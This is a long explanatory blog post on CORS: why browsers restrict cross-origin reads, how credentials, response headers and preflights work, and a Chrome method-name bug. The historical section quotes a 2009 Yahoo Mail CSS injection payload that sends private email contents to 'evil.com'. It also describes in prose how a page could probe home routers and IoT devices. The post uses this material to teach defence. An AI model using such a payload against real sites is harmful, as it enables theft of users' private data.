---
title: How to win at CORS
date: 2021-10-12 01:00:00
summary: The 'how' and 'why' of CORS, from start to finish.
meta: The 'how' and 'why' of CORS, from start to finish.
image: 'asset-url:./img.png'
---

CORS is hard. It's hard because it's part of how browsers fetch stuff, and that's a set of behaviours that started with the very first web browser over thirty years ago. Since then, it's been a constant source of development; adding features, improving defaults, and papering over past mistakes without breaking too much of the web.

Anyway, I figured I'd write down pretty much everything I know about CORS, and to make things _interactive_, I built an exciting new app:

<link rel="preload" as="font" crossorigin href="asset-url:shared/demos/2021/cors/cors-playground/logo-font.woff2">

<style>
@font-face {
  font-family: 'Gaegu';
  font-style: normal;
  font-weight: 400;
  src: url('asset-url:shared/demos/2021/cors/cors-playground/logo-font.woff2') format('woff2');
}

.playground-logo {
  padding: 20px;
  display: grid;
  grid-template-columns: max-content 1fr;
  align-items: center;
  background: #c9fcb3;
  position: relative;
}
.playground-logo::before {
  content: '';
  position: absolute;
  inset: 0 0 auto 0;
  height: 18%;
  background: #b3e7fc;
}
.playground-logo svg {
  position: relative;
  height: 146px;
}
.playground-title {
  font-family: Gaegu;
  position: relative;
  font-size: 3.2rem;
  line-height: 0.7;
  text-align: right;
  color: #416830;
}
@media (min-width: 450px) {
  .playground-logo svg {
    height: 225px;
  }
}
@media (min-width: 530px) {
  .playground-logo {
    padding: 20px 32px;
  }
}
@media (min-width: 610px) {
  .playground-logo svg {
    height: 300px;
  }
}
@media (min-width: 690px) {
  .playground-title {
    font-size: 4.9rem;
  }
}
@media (min-width: 800px) {
  .playground-title {
    font-size: 3.2rem;
  }
}
@media (min-width: 970px) {
  .playground-title {
    font-size: 4.9rem;
  }
}
</style>

<figure class="full-figure max-figure">
<a href="playground/" target="playground" class="playground-logo">
<script type="component">{
  "module": "shared/demos/2021/cors/cors-playground/static-index",
  "exportName": "Logo",
  "staticOnly": true
}</script>
<span class="playground-title">The CORS playground</span>
</a>
</figure>

You can dive right into <a href="playground/" target="playground">the playground</a> now if you want, but I'll link to it throughout the article to demonstrate particular examples.

Anyway, I'm getting ahead of myself. Before I get to any of the 'how', I'm going to try to explain _why_ CORS is the way it is, by looking at how it came into existence, and how it fits into other kinds of fetches. Wish me luck…

# Cross-origin access without CORS

<blockquote class="quote"><p>I'd like to propose a new, optional HTML tag: IMG. Required argument is SRC="url".</p>– <a href="http://1997.webhistory.org/www.lists/www-talk.1993q1/0182.html">Marc Andreessen in 1993</a></blockquote>

Browsers have been able to include images from other sites for almost 30 years. You don't need the other site's permission to do this, you can just do it. And it didn't stop with images:

```html
<script src="…"></script>
<link rel="stylesheet" href="…" />
<iframe src="…"></iframe>
<video src="…"></video>
<audio src="…"></audio>
```

APIs like these let you make a request to another website and process the response in a particular way, without the other site's consent.

This started getting complicated in 1994 with the advent of HTTP cookies. HTTP cookies became part of a set of things we call [_credentials_](https://fetch.spec.whatwg.org/#credentials), which also includes TLS client certificates (not to be confused with server certificates), and the state that automatically goes in the `Authorization` request header when using HTTP authentication (if you've never heard of this, don't worry, it's shite).

Credentials mean web content can be tailored for a particular user. It's how Twitter shows you _your_ feed, it's how your bank shows you _your_ accounts.

When you request other-site content using one of the methods above, it sends along the credentials for the other-site. And over the years that's created a colossal sackload of security issues.

```html
<img src="https://your-bank/your-profile/you.jpg" />
```

If the above image loads, I get a `load` event. If it doesn't load, I get an `error` event. If that differs depending on if you're logged in or not, that tells me a lot about you. I can also read the width and height of the image, which, if it differs from user to user, tells me even more.

This gets worse with a format like CSS, which has more capabilities, but doesn't immediately fail on parse errors. In 2009 it turned out Yahoo Mail was vulnerable to a fairly simple exploit. The attacker sends the user one email with a subject including `');}`, and later another with a subject including `{}html{background:url('//evil.com/?`:

```html
…
<li class="email-subject">Hey {}html{background:url('//evil.com/?</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">Yo ');}</li>
…
```

This means some of the user's private email data is sandwiched between something that will parse as a valid bit of CSS. Then, the attacker convinces the user to visit a page containing:

```html
<link rel="stylesheet" href="https://m.yahoo.com/mail" />
```

…which is loaded using `yahoo.com`'s cookies, the CSS parses, and sends private information to `evil.com`. Oh no.

And that's just the tip of the shitberg. From [browser bugs](/2018/i-discovered-a-browser-bug/) to [CPU exploits](<https://en.wikipedia.org/wiki/Meltdown_(security_vulnerability)>), these leaky resources have given us decades of problems.

# Locking things down

It's become pretty clear that the above was a mistake in the design of the web, so we no longer create APIs that can process these kinds of requests. Meanwhile, we've spent the last few decades patching things up as best we can:

- CSS from another origin (I'll get to a definition of 'origin' shortly) now needs to be sent with a CSS `Content-Type`. Unfortunately we can't enforce the same thing for scripts and images, or CSS on [quirks mode](https://en.wikipedia.org/wiki/Quirks_mode) pages, without breaking significant portions of the web. However…
- We prevent particular response types from another origin being loaded as image/script/etc., such as HTML, JSON, and XML (except SVG). This protection is called [CORB](https://fetch.spec.whatwg.org/#corb).
- More recently, we don't send cookies along with the request from site-A to site-B, unless site-B has opted-in using the [`SameSite` cookie attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite). Without cookies, the site generally returns the 'logged-out' view, without private data.
- Firefox and Safari go a step further, and try to fully isolate sites, although how this works is currently pretty different between the two.

## The same-origin policy

Back in 1995, Netscape 2 landed with two amazing new features: LiveScript (you probably know this better as 'JavaScript'), and HTML frames. Frames let you embed one page in another, and LiveScript could interact with both pages.

Netscape realised that this presented a security issue; you don't want an evil page to be able to read the DOM of your banking page, so they decided that cross-frame scripting would only be allowed if both pages had the same _origin_.

<style>
.origin-example {
  display: grid;
  grid-template-columns: max-content max-content;
}
.origin {
  grid-area: 1 / 1;
  color: #ff824a;
}
.path {
  grid-area: 1 / 2;
}
.origin-label {
  grid-area: 2 / 1;
  text-align: center;
  display: grid;
  grid-template-columns: 1fr max-content 1fr;
  align-items: top;
  gap: 0.3em;
  color: #ff824a;
}
.origin-label::before,
.origin-label::after {
  content: '';
  border: 1px solid currentcolor;
  height: 50%;
}
.origin-label::before {
  border-width: 0 0 1px 1px;
}
.origin-label::after {
  border-width: 0 1px 1px 0;
}
</style>

<div class="code-example"><pre class="language-xml"><code><div class="origin-example"><div aria-labelledby="origin-label" class="origin">https://jakearchibald.com:443</div><div class="path">/2021/blah/?foo#bar</div><div id="origin-label" class="origin-label">The origin</div></div></code></pre></div>

The idea was that sites on the same origin are more likely to have the same owner. That wasn't completely true, since a lot of sites divided content by URLs such as `http://example.com/~jakearchibald/`, but the line had to be drawn somewhere.

From that point, features that granted deep visibility into a resource were limited to same-origin. This included `new ActiveXObject('Microsoft.XMLHTTP')` which first appeared in IE5 in 1999, and later became the web standard `XMLHttpRequest`.

## Origins vs sites

Some web features don't deal with origins, they deal with 'sites'. For instance, `https://help.yourbank.com` and `https://profile.yourbank.com` are different origins, but they're the same site. Cookies are the most common feature that operate at a site level, as you can create cookies that are sent to all subdomains of `yourbank.com`.

But how does the browser know that `https://help.yourbank.com` and `https://profile.yourbank.com` are part of the same site, but `https://yourbank.co.uk` and `https://jakearchibald.co.uk` are different sites? I mean… they all have three parts separated by dots.

Well, the answer was a bunch of heuristics in each browser, but in 2007 Mozilla swapped their heuristics for a list. That list is now maintained as a separate community project known as the [public suffix list](https://publicsuffix.org/), and it's used by all browsers and many other projects.

If someone says they understand the security implications of URLs without UI hints, be sure to check they can recite all 9000+ entries of the public suffix list from memory.

<script type="component">{
  "module": "shared/demos/2021/cors/SiteVsOrigin",
  "exportName": "Styles",
  "staticOnly": true
}</script>

<script type="component">{
  "module": "shared/demos/2021/cors/SiteVsOrigin",
  "props": {}
}</script>

The above uses a live version of the public suffix list, but I had to proxy it because the actual list doesn't use CORS. The irony.

So `https://app.jakearchibald.com` and `https://other-app.jakearchibald.com` are part of the same site, but `https://app.glitch.me` and `https://other-app.glitch.me` are different sites. These cases are different because `glitch.me` is on the public suffix list whereas `jakearchibald.com` is not. This is 'correct', because different people 'own' the subdomains of `glitch.me`, whereas I own all the subdomains of `jakearchibald.com`.

# Opening things up again

Ok, so we've got these APIs like `<img>` that can access resources from other origins, but visibility into the response is limited (but not limited enough in hindsight), and we've got these more powerful APIs like cross-frame scripting and `XMLHttpRequest` which only work same-origin.

How could we allow those more powerful APIs to work _across_ origins?

## Remove credentials?

Let's say we provide an opt-in so the request is sent without credentials. The response will be the 'logged-out' view, so it won't contain any private data, and can be revealed without concern, right?

Unfortunately there're a lot of HTTP endpoints out there that 'secure' themselves using things other than browser credentials.

A lot of company intranets assume they're 'private' because they're only accessible from a particular network. Some routers and IoT devices assume they're only accessible by well-meaning folks because they're restricted to your home network (remember, the 's' in 'IoT' stands for security). Some websites offer different content depending on the IP address they're accessed from.

So, if you visit my website from your home, I could start making requests to common hostnames and IP addresses, looking for insecure IoT devices, looking for routers using default passwords, and generally make your life very miserable, all without needing browser credentials.

Removing credentials is part of the solution, but it isn't enough on its own. There's no way to know that a resource contains private data, so we need some way for the resource to declare "hey, it's fine, let the other site read my content".

## Separate resource opt-in?

The origin could have some special resource that details its permissions regarding cross-origin access. That's the [security model Flash went with](https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/xdomain.html). Flash looked for a `/crossdomain.xml` in the root of the site that looked like this:

```xml
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "https://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
  <site-control permitted-cross-domain-policies="master-only" />
  <allow-access-from domain="*.example.com" />
  <allow-access-from domain="www.example.com" />
  <allow-http-request-headers-from domain="*.adobe.com" headers="SOAPAction" />
</cross-domain-policy>
```

There are a few issues with this:

- It changes the behaviour for the whole origin. You can imagine a similar format that lets you specify rules for particular resources, but the resource would start to get quite large.
- You end up with two requests, one for the `/crossdomain.xml`, and one for the actual resource. This becomes more of an issue the bigger `/crossdomain.xml` gets.
- For larger sites built by multiple teams, you end up with issues over ownership of `/crossdomain.xml`.

## In-resource opt-in?

To cut down the number of requests, the opt-in could be granted within the resource itself. This technique was proposed by the W3C Voice Browser Working Group back in 2005, using an XML processing instruction:

```
<?access-control allow="*.example.com" deny="*.visitors.example.com"?>
```

But what if the resource wasn't XML? Well, the opt-in would need to be in a different format.

This is kinda where things landed for frame-to-frame communication. Both sides opt-in using [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), and can declare the origin they're happy to communicate with.

But what about accessing the raw bytes of the resource? In that case it doesn't make sense to use resource-specific metadata for the opt-in. And besides, HTTP already has a place for resource metadata…

## HTTP header opt-in

The proposal by the Voice Browser Working Group was generalised using HTTP headers, and that became CORS.

```
Access-Control-Allow-Origin: *
```

# Making a CORS request

Most modern web features require CORS by default, such as `fetch()`. The exception is modern features that are designed to support older features that don't use CORS, e.g., `<link rel="preload">`.

Unfortunately there's no easy rule for what does and doesn't require CORS. For example:

```html
<!-- Not a CORS request -->
<script src="https://example.com/script.js"></script>
<!-- CORS request -->
<script type="module" src="https://example.com/script.js"></script>
```

The best way to figure it out is to try it and look at network DevTools. In Chrome and Firefox, cross-origin requests are sent with a [`Sec-Fetch-Mode` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode) which will tell you if it's a CORS request or not. Unfortunately Safari hasn't implemented this yet.

<a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=" target="playground">Try it in the CORS playground</a> - When you make the request, it'll log the headers the server received. If you're using Chrome or Firefox you'll see `Sec-Fetch-Mode` set to `cors` in there, along with some other interesting `Sec-` headers. However, if you <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=&responseAllowCredentials=&responseExposeHeaders=" target="playground">make a no-CORS request</a>, `Sec-Fetch-Mode` will be `no-cors`.

If an HTML element causes a no-CORS fetch, you can use the badly-named `crossorigin` attribute to switch it to a CORS request.

```html
<img crossorigin src="…" />
<script crossorigin src="…"></script>
<link crossorigin rel="stylesheet" href="…" />
<link crossorigin rel="preload" as="font" href="…" />
```

When you switch these over to CORS, you get more visibility into the cross-origin resource:

- You can paint the `<img>` to a `<canvas>` and read back the pixels.
- You get more detailed stack traces for script [in particular weird cases](https://github.com/whatwg/html/issues/2440).
- You get extra features like [subresource integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#subresource_integrity_with_the_%3Cscript%3E_element).
- You can explore the parsed stylesheet via [`link.sheet`](https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleSheet).

With `<link rel="preload">`, you need to ensure it uses CORS if the eventual request will also use CORS, otherwise it won't match in the preload cache, and you'll end up with two requests.

# CORS requests

By default, a cross-origin CORS request is made without credentials. So, no cookies, no client certs, and no automatic `Authorization` header, and `Set-Cookie` on the response is ignored. However, same-origin requests include credentials.

By the time CORS was developed, the [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header was frequently spoofed or removed by browser extensions, so a new header, [`Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin), was created, which provides the origin of the page that made the request.

`Origin` is generally useful, so it's been added to lots of other types of request, such as WebSocket and `POST` requests. Browsers tried adding it to regular `GET` requests too, but it broke a bunch of sites that assumed the presence of the `Origin` header means it's a CORS request 😬. Maybe one day.

<a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=" target="playground">Try it in the CORS playground</a> - When you make the request, it'll log the headers the server received, which will include `Origin`. If you <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=&responseAllowCredentials=&responseExposeHeaders=" target="playground">make a no-CORS `GET` request</a>, the `Origin` header isn't sent, but it appears again if you <a href="playground/?prefillForm=1&requestMethod=POST&requestUseCORS=&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=&responseAllowCredentials=&responseExposeHeaders=" target="playground">make a no-CORS `POST` request</a>.

# CORS responses

To pass the CORS check and give the other origin access to the response, the response must include this header:

```
Access-Control-Allow-Origin: *
```

The `*` can be replaced with the value of the request's `Origin` header, but `*` works for any requesting origin provided the request is sent without credentials (more on that in a bit). As with all headers, the header name is case-insensitive, but the value is case sensitive.

Try it in the CORS playground:

- <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=" target="playground">`*` works</a>.
- <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2Fjakearchibald.com&responseAllowCredentials=&responseExposeHeaders=" target="playground">`https://jakearchibald.com` works</a>.
- The following _do not work_, as the only accepted values are `*` and the exact case-sensitive value of the request's `Origin` header:
  - <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2Fjakearchibald.com%2F&responseAllowCredentials=&responseExposeHeaders=" target="playground">"https://jakearchibald.com/"</a> - the trailing `/` means it doesn't match the `Origin` header.
  - <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2FJAKEarchibald.com&responseAllowCredentials=&responseExposeHeaders=" target="playground">"https://JAKEarchibald.com"</a> - the casing doesn't match the `Origin` header.
  - <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2Fjakearchibald.*&responseAllowCredentials=&responseExposeHeaders=" target="playground">"https://jakearchibald.\*"</a> - nah, wildcards don't work like that.
  - <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2Fjakearchibald.com%2C+https%3A%2F%2Fexample.com&responseAllowCredentials=&responseExposeHeaders=" target="playground">"https://jakearchibald.com, https://example.com"</a> - only one value can be provided.

A valid value gives the other origin access to the response body, and also a subset of the headers:

- `Cache-Control`
- `Content-Language`
- `Content-Type`
- `Expires`
- `Last-Modified`
- `Pragma`

The response can include another header, `Access-Control-Expose-Headers`, to reveal additional headers:

```
Access-Control-Expose-Headers: Custom-Header-1, Custom-Header-2
```

The matching is case-insensitive since header names are case-insensitive . You can also use:

```
Access-Control-Expose-Headers: *
```

…to expose (almost) all the headers, if the request is sent without credentials (more on that in a bit).

The `Set-Cookie` and `Set-Cookie2` (a deprecated failed 'sequel' to `Set-Cookie`) headers are never exposed to avoid leaking cookies across sites.

Try it in the CORS playground:

- <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=foo%2C+date" target="playground">Exposing particular headers</a>.
- <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=*" target="playground">Exposing all headers</a>.

# Is it safe to expose resources via CORS?

`Access-Control-Allow-Origin: *` only grants response visibility if the request is made without credentials, so it's totally safe to use on all resources _unless_ that resource contains private data that's 'secured' using something other than browser credentials.

If you _are_ securing things using something other than browser credentials, _stop doing that_. It's not actually secure. Platform apps will be able to get at that data and send it wherever they want.

Open the resource in an incognito/private browser tab. Are you happy with other sites having access to that, including the source and the response headers listed above? Then it's safe to expose it via CORS.

# Should CORS headers be served conditionally?

As we've already seen, CORS requests look different to regular requests. I've seen some endpoints use these signals to decide whether to add `Access-Control-Allow-Origin: *` to the response, but I think that's unnecessary complication. `Access-Control-Allow-Origin: *` doesn't do any harm on a no-CORS response, and conditionally adding CORS headers can land you with a tricky bug:

Let's say a user makes a no-CORS request for a resource, then later makes a CORS request for the same resource. If the browser/CDN doesn't know any better, it might re-serve the first response without `Access-Control-Allow-Origin: *`, and the CORS check fails.

If you insist on adding `Access-Control-Allow-Origin: *` conditionally, then make sure you also add a `Vary` header:

```
Vary: Origin
```

This tells the browser, and any intermediate things like a CDN, that the response differs depending on the value of the `Origin` header. This header needs to go on the no-CORS response as well as the CORS response. Of course, if you're using some other header as the trigger, `Vary` on that header too.

# Adding credentials

Cross-origin CORS requests are made without credentials by default. However, various APIs will allow you to add the credentials back in.

With fetch:

```js
const response = await fetch(url, {
  credentials: 'include',
});
```

Or with HTML elements:

```html
<img crossorigin="use-credentials" src="…" />
```

However, this makes the opt-in stronger. The response must contain:

```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://jakearchibald.com
Vary: Cookie, Origin
```

If the CORS request includes credentials, the response must include the `Access-Control-Allow-Credentials: true` header, and the value of `Access-Control-Allow-Origin` must reflect the request's `Origin` header (`*` isn't an acceptable value if the request has credentials).

The opt-in is stronger because, well, exposing private data is risky, and should only be done for origins you really trust.

The same-site rules around cookies still apply, as do the kinds of isolation we see in Firefox and Safari. But these only come into effect cross-site, not cross-origin.

It's important to use the `Vary` header in this case if your response is cacheable in any way. And not just by the browser, but also intermediate things like a CDN. Use `Vary` to tell browsers and intermediates that the response is different depending on particular request headers, else the user might end up with a response with the wrong `Access-Control-Allow-Origin` value.

<a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=1&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=https%3A%2F%2Fjakearchibald.com&responseAllowCredentials=true&responseExposeHeaders=&responseCookieName=hello&responseCookieValue=world" target="playground">Try it in the CORS playground</a> - This request meets all the criteria, and also sets a cookie. If you make the request a second time, you'll see the cookie being sent back.

# Unusual requests and preflights

So far, the response has been opting into exposing its data. All of the _requests_ have been assumed to be safe, because they're not doing anything unusual.

```js
fetch(url, { credentials: 'include' });
```

There's nothing unusual about the above, because the request is really similar to what an `<img>` can do already.

```js
fetch(url, {
  method: 'POST',
  body: formData,
});
```

There's nothing unusual about the above, because the request is really similar to what a `<form>` can already do.

```js
fetch(url, {
  method: 'wibbley-wobbley',
  credentials: 'include',
  headers: {
    fancy: 'headers',
    'here-we': 'go',
  },
});
```

Ok, that's pretty unusual.

What counts as 'unusual' is pretty complicated, but at a high level, if it's the kind of request that other browser APIs don't generally make, then it's unusual. At a lower level, if the request method isn't `GET`, `HEAD`, or `POST`, or it includes headers or header values that aren't part of the [safelist](https://fetch.spec.whatwg.org/#cors-safelisted-request-header), then it counts as unusual. In fact, I [made a change to this part of the spec](https://github.com/whatwg/fetch/pull/1312) recently to add particular `Range` headers to this list.

If you try to make an unusual request, the browser first asks the other origin if it's ok to send it. This process is called a _preflight_.

## Preflight request

Before making the main request, the browser makes a preflight request to the destination URL with a method of `OPTIONS`, and headers like this:

```
Access-Control-Request-Method: wibbley-wobbley
Access-Control-Request-Headers: fancy, here-we
```

- `Access-Control-Request-Method` - The HTTP method that the main request will use. This is included even if the method isn't unusual.
- `Access-Control-Request-Headers` - The unusual headers that the main request will use. If there are no unusual headers, this header isn't sent.

The preflight request never includes credentials, even if the main request will.

## Preflight response

The server responds to indicate whether it's happy for the main request to go ahead, using headers like this:

```
Access-Control-Max-Age: 600
Access-Control-Allow-Methods: wibbley-wobbley
Access-Control-Allow-Headers: fancy, here-we
```

- `Access-Control-Max-Age` - The number of seconds to cache this preflight response, to avoid the need for further preflights to this URL. The default is 5 seconds. Some browsers have an upper-limit on this. In Chrome it's 600 (10 minutes), and in Firefox it's 86400 (24 hours).
- `Access-Control-Allow-Methods` - The _unusual_ methods to allow. This can be a comma-separated list, and values are case-sensitive. If the main request is to be sent without credentials, this can be `*` to allow any method. You can't allow `CONNECT`, `TRACE`, or `TRACK` as these are on a <span style="white-space: nowrap">[🔥💀 FORBIDDEN LIST 💀🔥](https://fetch.spec.whatwg.org/#forbidden-method)</span> for security reasons.
- `Access-Control-Allow-Headers` - The _unusual_ headers to allow. This can be a comma-separated list, and values are case-insensitive since header names are case-insensitive. If the main request is to be sent without credentials, this can be `*` to allow any header that isn't on a <span style="white-space: nowrap">[🔥💀 DIFFERENT FORBIDDEN LIST 💀🔥](https://fetch.spec.whatwg.org/#forbidden-header-name)</span>.

Headers in the <span style="white-space: nowrap">[🔥💀 FORBIDDEN LIST 💀🔥](https://fetch.spec.whatwg.org/#forbidden-header-name)</span> are headers that must remain in the browser's control for security reasons. They're automatically (and silently) stripped from CORS requests and `Access-Control-Allow-Headers`.

The preflight response must also pass a regular CORS check, so it needs `Access-Control-Allow-Origin`, and also `Access-Control-Allow-Credentials: true` if the main request is to be sent with credentials, and the status code must be between 200-299 inclusive.

If the intended method is allowed, and all the intended headers are allowed, then the main request goes ahead.

Oh, and the preflight only gives the go-ahead for the request. The eventual response must also pass a CORS check.

### There's a Chrome bug with method names

[Chrome has a bug here](https://bugs.chromium.org/p/chromium/issues/detail?id=1228178) that I didn't know about until writing this post.

HTTP method names are somewhat case sensitive. I say 'somewhat' because if you use a method name that's a case-insensitive match for `get`, `post`, `head`, `delete`, `options`, or `put` then it's automatically uppercased, but other methods maintain the casing you use.

Unfortunately, Chrome expects the value to be uppercased in `Access-Control-Allow-Methods`. If your method is `Wibbley-Wobbley` and the preflight responds with:

```
Access-Control-Allow-Methods: Wibbley-Wobbley
```

…it'll fail the check in Chrome. Whereas:

```
Access-Control-Allow-Methods: WIBBLEY-WOBBLEY
```

…will pass the check in Chrome (and it'll make the request with the `Wibbley-Wobbley` method), but it'll fail in other browsers which are following the spec. To work around it, you can provide both methods:

```
Access-Control-Allow-Methods: Wibbley-Wobbley, WIBBLEY-WOBBLEY
```

…or just use `*` if it's a request without credentials.

Ok, let's put all of that together, for one last time, in the CORS playground:

- <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=" target="playground">A simple request</a>. This doesn't require a preflight.
- <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=405&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=&requestHeaderName=hello&requestHeaderValue=world" target="playground">An unusual header</a>. This triggers a preflight, and the server doesn't allow the request.
- <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=*&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=&requestHeaderName=hello&requestHeaderValue=world" target="playground">An unusual header, again</a>, but this time the preflight is correctly configured, so the request goes through.
- <a href="playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=*&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=&requestHeaderName=range&requestHeaderValue=bytes%3D0-" target="playground">A normal `Range` header</a>. This relates to the [spec change I made](https://github.com/whatwg/fetch/pull/1312). When browsers implement the change, this request won't need a preflight. It's currently implemented in Chrome Canary.
- <a href="playground/?prefillForm=1&requestMethod=Wibbley-Wobbley&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=Wibbley-Wobbley&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=" target="playground">An unusual method</a>. This highlights the Chrome bug documented above. The request won't go through in Chrome, but it'll work in other browsers.
- <a href="playground/?prefillForm=1&requestMethod=Wibbley-Wobbley&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=Wibbley-Wobbley%2C+WIBBLEY-WOBBLEY&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=" target="playground">An unusual method, again</a>. This works around the Chrome bug.

# Phew!

Whoa, you made it to the end! Sorry, this post ended up way longer than I intended, but I hope it helps make sense of the whole CORS thing.

A huge thanks to [Anne van Kesteren](https://twitter.com/annevk), [Simon Pieters](https://twitter.com/zcorpan), [Thomas Steiner](https://twitter.com/tomayac), [Ethan](https://twitter.com/Booligoosh), [Mathias Bynens](https://twitter.com/mathias), [Jeff Posnick](https://twitter.com/jeffposnick), and [Matt Hobbs](https://twitter.com/TheRealNooshu) for proof-reading, fact-checking, and spotting bits that needed more detail.
